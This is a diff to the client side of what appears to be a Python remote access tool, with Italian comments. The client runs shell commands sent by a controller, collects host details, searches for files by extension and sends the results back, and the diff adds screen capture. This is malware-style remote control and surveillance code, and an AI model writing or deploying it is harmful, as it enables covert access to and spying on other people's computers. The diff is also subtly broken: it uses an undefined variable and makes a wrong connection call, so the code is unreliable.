@@ -13,6 +13,8 @@ import traceback
 from threading import Timer
 from traceback import print_exc
 
+import pyautogui
+
 IP = "localhost"
 PORT = 8082  # Porta di Ascolto del TCP
 ADDR = (IP, PORT)
@@ -167,11 +169,12 @@ def filespath(tipologia, client):
                             if item.endswith(tipologia):
                                 result.append('"' + item + '"' + " nel percorso: " + cartella + "/" + cart + "\n")
 
-    result.append("\n### TROVATI TUTTI I FILE CON ESTENSIONE " + tipologia + "###\n\n")
+    result.append("\n### TROVATI TUTTI I FILE CON ESTENSIONE " + allType + "###\n\n")
     result = ''.join(result)
 
     try:
         filesize = sys.getsizeof(result)
+        print(filesize)
         client.send((str(filesize)).encode(FORMAT))
         time.sleep(3)
         client.send((result).encode(FORMAT))
@@ -219,7 +222,7 @@ def find(comando, client):
 
 
 # [Funzione] che esegue i commandi sulla macchina client e li manda al server
-def eseguiCommando(client, command, sistemaOperativo):
+def eseguiComando(client, command, sistemaOperativo):
     try:
         if sistemaOperativo == "Windows":
             process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
@@ -276,8 +279,11 @@ def openRemoteControl(client):
             elif comando[0:5] == "cd ..":
                 os.chdir("..")
             elif comando[0:2] == "cd":
-                path = comando[3:]
-                os.chdir(os.getcwd() + "/" + path)
+                if comando[3:4] != "C" and comando[3:4] != "/":
+                    path = comando[3:]
+                    os.chdir(os.getcwd() + "/" + path)
+                else:
+                    os.chdir(comando[3:])
             elif comando[0:2] == "ls":
                 if len(comando) == 2:
                     # ritorna una lista
@@ -307,9 +313,12 @@ def openRemoteControl(client):
                 infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd() + "\n"
                 client.send(((infos)).encode(FORMAT))
                 time.sleep(1.5)
+            elif comando[0:10]=="screenshot":
+                myScreenshot = pyautogui.screenshot()
+                clientConnection().send(myScreenshot.encode())
             #Tutti gli altri commandi
             else:
-                eseguiCommando(client,comando,platform.system())
+                eseguiComando(client,comando,platform.system())
 
         except Exception as e:
             traceback.print_exc()
